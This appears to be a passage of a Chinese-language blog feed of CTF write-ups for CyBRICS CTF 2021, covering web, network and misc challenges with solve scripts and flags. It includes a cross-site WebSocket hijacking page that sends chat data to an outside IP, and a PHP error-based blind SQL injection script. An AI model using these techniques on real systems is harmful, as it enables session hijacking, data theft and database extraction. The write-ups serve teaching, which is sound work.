class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;^(bytes.*)\\n&#39;&#125;,&#39;$1&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;\\t\\n|bytes&#x3D;&#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;\\t\\t|-&#39;&#125;,&#39;,&#39;,true,false,true,false)</span><br></pre></td></tr></table></figure><p>å°†å¾—åˆ°çš„æ•°æ®ä½¿ç”¨ Excel å¯¹ä¸¤ä½å’Œå››ä½é•¿åº¦çš„æ•°æ®åˆ†åˆ«æ’åºåå¯¼å‡ºï¼Œå† <code>From Hex</code> å¤„ç†ä¸€æ¬¡å¯ä»¥å¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸² <code>0edbca2531daefac9c5c84c016792713fd23681ea8bc1b3d088b617f75940313</code> å’Œä¸€ä¸ªå‹ç¼©åŒ…ã€‚ä½¿ç”¨è¯¥å­—ç¬¦ä¸²ä½œä¸ºå‹ç¼©åŒ…çš„å¯†ç å°†å…¶è§£å‹å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IJCTF&#123;aa51f2cc8eaf466a277da70db3a3c576&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>7th XCTF &amp; CyBRICS CTF 2021</title>
      <link href="/zh-CN/posts/aeac0311.html"/>
      <url>/zh-CN/posts/aeac0311.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ad-Network"><a href="#Ad-Network" class="headerlink" title="Ad Network"></a>Ad Network</h3><blockquote><p>Author: Alexander Menshchikov (<a href="https://t.me/n0str">@n0str</a>)</p><p>We are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.</p><p>There is a flag 1337 redirects deep into the networkâ€¦</p></blockquote><p><code>/adnetwork</code> ä¸‹æœ‰é‡å®šå‘ï¼Œæ¬¡æ•°å¤§æ¦‚ä¸º 1337 æ¬¡ï¼Œæ„é€ å‡ºå¦‚ä¸‹è„šæœ¬æ¥è·å¾— flagã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$URL</span> = <span class="string">&quot;http://adnetwork-cybrics2021.ctf.su/adnetwork&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> Client(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;timeout&quot;</span> =&gt; <span class="number">15</span>,</span><br><span class="line">    <span class="string">&quot;allow_redirects&quot;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&quot;verify&quot;</span> =&gt; <span class="literal">false</span></span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">1338</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="variable">$client</span>-&gt;get(<span class="variable">$URL</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;proxy&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;http&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1:7890&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;https&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1:7890&#x27;</span></span><br><span class="line">            )</span><br><span class="line">        ));</span><br><span class="line">    &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[i--] <span class="subst">$e</span>&quot;</span>;</span><br><span class="line">        <span class="variable">$i</span>--;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$response</span>-&gt;getBody()-&gt;getContents();</span><br><span class="line">    <span class="variable">$URL</span> = str_replace(<span class="string">&quot;\&quot;&gt;See Other&lt;/a&gt;.\n\n&quot;</span>, <span class="string">&quot;&quot;</span>, str_replace(<span class="string">&quot;&lt;a href=\&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$content</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[<span class="subst">$i</span>] &quot;</span> . <span class="variable">$URL</span> . PHP_EOL;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$content</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z&#125;</span><br></pre></td></tr></table></figure><h3 id="Multichat"><a href="#Multichat" class="headerlink" title="Multichat"></a>Multichat</h3><blockquote><p>Author: Alexander Menshchikov (<a href="https://t.me/n0str">@n0str</a>)</p><p>Yet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.</p><p>Tip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): â€œ<code>Hey, i forgot the flag. Can you remind me?</code>â€œ. Then admin will tell him the flag.</p></blockquote><p>åŸºäº WebSocket çš„èŠå¤©å®¤ï¼Œæ ¹æ®é¢˜ç›®æè¿°ï¼Œåªéœ€è¦æŠ€æœ¯å‘˜å‘ç®¡ç†å‘˜å‘é€æŒ‡å®šå­—ç¬¦ä¸²å³å¯æ¥æ”¶åˆ° flagã€‚åœ¨ 5000 ç«¯å£ç»™äº†ä¸€ä¸ªä¸ŠæŠ¥ URL çš„é¡µé¢ã€‚å› æ­¤ï¼Œåªéœ€è¦æ„å»ºä¸€ä¸ªå‰ç«¯é¡µé¢è¿›è¡Œ CSRF å³å¯ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> socket = <span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://multichat-cybrics2021.ctf.su/ws&quot;</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">            socket.onopen = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                socket.send(<span class="string">&quot;Hey, i forgot the flag. Can you remind me?&quot;</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            socket.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> exportFlag = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">                exportFlag.open(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;http://8.136.8.210:3255/flagis-&#x27;</span> + <span class="built_in">window</span>.btoa(e.data));</span></span><br><span class="line">                exportFlag.send();</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å°†é¡µé¢æ”¾åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œæäº¤ç»™é¶æœºï¼Œå¯åœ¨ç›‘å¬çš„ç«¯å£å¤„å¾—åˆ°å¦‚ä¸‹å“åº”ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627146665815106/cc0e33635d5c036ca114db256c8ece558677e3d2.jpg"></p><p>å°†å…¶ä¸­å¸¦å‡ºçš„ä¿¡æ¯è§£ç å¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sure, dude. The flag is cybrics&#123;Pwn3d_CR055_51t3_W3850CK3t_h1jACK1n9&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;Pwn3d_CR055_51t3_W3850CK3t_h1jACK1n9&#125;</span><br></pre></td></tr></table></figure><h3 id="Announcement"><a href="#Announcement" class="headerlink" title="Announcement"></a>Announcement</h3><blockquote><p>Author: Alexander Menshchikov (@n0str)</p><p>Ladies and gentlemen!</p><p>Allow us to introduce a brand new project â€”<br>âš The Flag</p></blockquote><p>åœ¨æäº¤çš„å‚æ•°ä¸­ SQL æ³¨å…¥ï¼Œå…¶ä¸­ <code>digest</code> å‚æ•°çš„å€¼éœ€ä¸º <code>email</code> çš„ MD5ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627147306218176/cf696473812c358ea52022ff8ccbbc179861027a.png"></p><p>å†™è„šæœ¬æ„é€ æŠ¥é”™é€»è¾‘è¿›è¡Œç›²æ³¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$URL</span> = <span class="string">&quot;http://announcement-cybrics2021.ctf.su/&quot;</span>;</span><br><span class="line"><span class="comment">//$statement = &quot;select database()&quot;; //announcement</span></span><br><span class="line"><span class="comment">//$statement = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;; //emails,logs</span></span><br><span class="line"><span class="comment">//$statement = &quot;select group_concat(column_name) from information_schema.columns where table_schema=database()&quot;; //email,id,timestamp,log</span></span><br><span class="line"><span class="variable">$statement</span> = <span class="string">&quot;select group_concat(log) from announcement.logs&quot;</span>; <span class="comment">//flag</span></span><br><span class="line"><span class="variable">$text</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> Client(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;timeout&quot;</span> =&gt; <span class="number">5</span>,</span><br><span class="line">    <span class="string">&quot;allow_redirects&quot;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&quot;verify&quot;</span> =&gt; <span class="literal">false</span></span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$count</span> = <span class="number">1</span>; <span class="variable">$count</span> &lt;= <span class="number">100</span>; <span class="variable">$count</span>++)&#123;</span><br><span class="line">    <span class="variable">$low</span> = <span class="number">32</span>;</span><br><span class="line">    <span class="variable">$high</span> = <span class="number">126</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$low</span> &lt;= <span class="variable">$high</span>)&#123;</span><br><span class="line">        <span class="variable">$mid</span> = (<span class="keyword">int</span>)((<span class="variable">$low</span> + <span class="variable">$high</span>) / <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;&#x27; or if((ascii(substr((<span class="subst">&#123;$statement&#125;</span>),<span class="subst">&#123;$count&#125;</span>,1)) &gt; <span class="subst">&#123;$mid&#125;</span>),1,cot(0)), NOW()) #&quot;</span>;</span><br><span class="line">        <span class="variable">$response</span> = <span class="variable">$client</span>-&gt;post(<span class="variable">$URL</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;proxy&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;http&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1:7890&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;https&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1:7890&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="string">&#x27;form_params&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;email&quot;</span> =&gt; <span class="variable">$sql</span>,</span><br><span class="line">                <span class="string">&quot;digest&quot;</span> =&gt; md5(<span class="variable">$sql</span>)</span><br><span class="line">            )</span><br><span class="line">        ));</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable">$response</span>-&gt;getBody()-&gt;getContents();</span><br><span class="line">        <span class="keyword">if</span>(stristr(<span class="variable">$content</span>, <span class="string">&quot;cot&quot;</span>))&#123;</span><br><span class="line">            <span class="variable">$high</span> = <span class="variable">$mid</span> - <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$low</span> = <span class="variable">$mid</span> + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$count</span> . PHP_EOL;</span><br><span class="line">    <span class="variable">$text</span> .= chr((<span class="keyword">int</span>)((<span class="variable">$high</span> + <span class="variable">$low</span> + <span class="number">1</span>) / <span class="number">2</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$text</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;1N53r7_0ld_900d_5ql&#125;</span><br></pre></td></tr></table></figure><h2 id="Cyber"><a href="#Cyber" class="headerlink" title="Cyber"></a>Cyber</h2><h3 id="Mic-Check"><a href="#Mic-Check" class="headerlink" title="Mic Check"></a>Mic Check</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;Th1S_i5_T3h_R34l_m1C_ch3CK_f1A6&#125;</span><br></pre></td></tr></table></figure><h2 id="rebyC"><a href="#rebyC" class="headerlink" title="rebyC"></a>rebyC</h2><h3 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h3><blockquote><p>Author: Mikhail Driagunov (@aethereternity)</p><p>Check out this cool new game!</p><p>I heard they serve flags at level 5.</p></blockquote><p>ä¾æ¬¡è§£å‡ºå‰å››ä¸ªç®€å•å…³å¡ã€‚ç¬¬äº”å…³ç»™äº†ä¸€ä¸ªæ»šåŠ¨çš„äºŒç»´ç ã€‚å…ˆä½¿ç”¨ GIF Splitter æŠ½å¸§åˆ†ç¦»ï¼Œå†å†™ä¸ªè„šæœ¬å°†å…¶è¿˜åŸå‡ºæ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627192904950265/9d927c64c13d995920d8d9fff41cac5bde5a700f.png@100w"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">ny = <span class="number">0</span></span><br><span class="line">newImage = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">989</span>, <span class="number">162</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>, <span class="number">145</span>, <span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;./gif/IMG00%03d.bmp&quot;</span> % x)</span><br><span class="line">    image = Image.<span class="built_in">open</span>((<span class="string">&quot;./gif/IMG00%03d.bmp&quot;</span> % x))</span><br><span class="line">    <span class="built_in">slice</span> = image.crop((<span class="number">46</span>, <span class="number">496</span>, <span class="number">1036</span>, <span class="number">502</span>))</span><br><span class="line">    newImage.paste(<span class="built_in">slice</span>, (<span class="number">0</span>, ny))</span><br><span class="line">    ny += <span class="number">6</span></span><br><span class="line">newImage = newImage.resize((<span class="number">500</span>, <span class="number">500</span>))</span><br><span class="line">newImage.save(<span class="string">&quot;this.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>æ‰«æäºŒç»´ç å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;N0w_Y0u_4r3_4_c4sh13r_LOL&#125;</span><br></pre></td></tr></table></figure><h3 id="CAPTCHA-The-Flag"><a href="#CAPTCHA-The-Flag" class="headerlink" title="CAPTCHA The Flag"></a>CAPTCHA The Flag</h3><blockquote><p>Author: Vlad Roskov (<a href="https://t.me/mrvos">@mrvos</a>)</p><p>Guessing challenges? On <em>my</em> CyBRICS? Itâ€™s more likely than you think.</p><p>Prove youâ€™re a true CTFer!</p></blockquote><p>å¡«å†™éªŒè¯ç çš„å°æ¸¸æˆï¼Œè¦åˆ†è§£é¢œè‰²æ‰èƒ½çœ‹è§éªŒè¯ç ã€‚æ„é€ å¦‚ä¸‹äº¤äº’å¼è„šæœ¬æ¥è§£å†³é—®é¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx <span class="keyword">as</span> requests</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># bit planes codes are from https://medium.com/@stephanie.werli/image-steganography-with-python-83381475da57</span></span><br><span class="line"><span class="comment"># Interactive Script</span></span><br><span class="line"></span><br><span class="line">session = requests.Client(proxies=&#123;</span><br><span class="line">    <span class="string">&quot;http://&quot;</span>: <span class="string">&quot;http://127.0.0.1:7890&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://&quot;</span>: <span class="string">&quot;http://127.0.0.1:7890&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    image = session.get(<span class="string">&quot;https://captf-cybrics2021.ctf.su/captcha.php&quot;</span>).content</span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;./tmp.png&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    file.write(image)</span><br><span class="line">    file.close()</span><br><span class="line"></span><br><span class="line">    data = np.array(Image.<span class="built_in">open</span>(<span class="string">&quot;./tmp.png&quot;</span>, <span class="string">&quot;r&quot;</span>))</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        res = data // <span class="number">2</span> ** k &amp; <span class="number">1</span></span><br><span class="line">        out.append(res * <span class="number">255</span>)</span><br><span class="line">    b = np.hstack(out)</span><br><span class="line">    Image.fromarray(b).show()</span><br><span class="line"></span><br><span class="line">    captcha = <span class="built_in">input</span>(<span class="string">&quot;Enter the captcha you have seen in the window:&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = session.post(<span class="string">&quot;https://captf-cybrics2021.ctf.su/&quot;</span>, data=&#123;<span class="string">&quot;answer&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;captcha&#125;</span>&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Hand up failed.&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Handed up <span class="subst">&#123;captcha&#125;</span> with response <span class="subst">&#123;response.content.decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627200498307069/fffe6eca797af1a13937dc3b4910cd55a59909e6.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;a_k33n_Ey3_wi11_sp0T_r1GhT_aw4Y&#125;</span><br></pre></td></tr></table></figure><h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><h3 id="LX-100"><a href="#LX-100" class="headerlink" title="LX-100"></a>LX-100</h3><blockquote><p>Author: Vlad Roskov (<a href="https://t.me/mrvos">@mrvos</a>)</p><p>We were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.</p><p>Anyway, we were discussing CyBRICS flags there, hope thereâ€™s no way to leak them.</p></blockquote><p>Wireshark æ‰“å¼€æµé‡åŒ…ï¼Œè·Ÿè¸ª UDP æµåˆ° 4 å¯ä»¥å¾—åˆ°ä¸€ä»½ MJPEG è§†é¢‘æµã€‚å°†å…¶å¯¼å‡ºåä¿®æ­£æ‹“å±•åä¸º MJPEGï¼Œä½¿ç”¨ VLC Media Player æ’­æ”¾å¯å¾—å¦‚ä¸‹åŒ…å« flag çš„å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627212693312054/c8daa1b09c442b39ad9bfe7baf6f005776aaeef0.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;Lost_Secrets_In_The_Air&#125;</span><br></pre></td></tr></table></figure><h3 id="ASCII-Terminal"><a href="#ASCII-Terminal" class="headerlink" title="ASCII Terminal"></a>ASCII Terminal</h3><blockquote><p>Author: Artur Khanov (<a href="https://t.me/awengar">@awengar</a>)</p><p>you have an ASCII terminal. It really works, check with the <a href="https://cybrics.net/files/id.txt"><code>id</code> command</a></p></blockquote><p>æŠŠå­—ç¬¦ç”»å½“ä½œæŒ‡ä»¤æ¥æ‰§è¡Œçš„ç»ˆç«¯ï¼Œå­—ç¬¦ç”»é•¿åº¦ä¸º 30 è¡Œï¼Œä»¥ <code>.</code> å•ç‹¬åšä¸€è¡Œç»“æŸã€‚</p><blockquote><p><a href="https://www.text-image.com/convert/ascii.html">https://www.text-image.com/convert/ascii.html</a></p></blockquote><p>ç”¨ PowerPoint åšå‡ºå¦‚ä¸‹å›¾ç‰‡ï¼Œç„¶åä½¿ç”¨ä¸Šè¿°ç½‘ç«™ç”Ÿæˆå­—ç¬¦ç”»ï¼Œç„¶åç¨ä½œå¤„ç†å¾—åˆ°å¦‚ä¸‹è½½è·ï¼Œå› ä¸º <code>l</code> æ—¶å¸¸è¢«è¯¯è®¤ï¼Œæ‰€ä»¥å°†å…¶å»é™¤äº†ï¼ŒåŒæ—¶å› ä¸ºæœ‰ç›¸å½“éƒ¨åˆ†å­—ç¬¦ä¸å…è®¸è¢«ä½¿ç”¨ï¼Œè¿™é‡Œä½¿ç”¨äº†çº¯æ˜Ÿå·å’Œç‚¹æ›¿æ¢ç”Ÿæˆçš„å­—ç¬¦ç”»ä¸­çš„å­—ç¬¦ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627214895267041/70468b8a1da752ab51624eacd5666479ec8afb19.jpg"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................***::::**..............***......................</span><br><span class="line">........................................................................*.*..................................................************............****......................</span><br><span class="line">......................................................................:****................................................**************.......:*....***.....**...............</span><br><span class="line">......................................................................*****...............................................******...............****:*.***..******..............</span><br><span class="line">......................................................................*****...............................................*****...............*******************..............</span><br><span class="line">......................:***********........*************:*.......*********************.....................................*****...................*:*******:*..................</span><br><span class="line">..................*:**************........*****************.....*********************..............................*********************.......*****************...............</span><br><span class="line">..................******:.....*:*:........*****..**..******......********************..............................**********************......******************..............</span><br><span class="line">.................******................................*****..........*****........................................*********************.......:***...***...****...............</span><br><span class="line">................*****...........................***********...........*****...............................................*****......................****......................</span><br><span class="line">...............******.......................***************...........*****...............................................*****......................****......................</span><br><span class="line">...............******.....................*****************...........*****...............................................*****................................................</span><br><span class="line">................****:...................******.........****...........*****...............................................*****................................................</span><br><span class="line">................******..................*****..........****...........*****...............................................*****................................................</span><br><span class="line">.................******:.******.:*......*****:**.**.*******...........******.********.....................................*****................................................</span><br><span class="line">..................:***************.......******************............**************.....................................*****................................................</span><br><span class="line">.....................************..........**********..:****............*:***********.....................................****:................................................</span><br><span class="line">...............................................*...............................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span 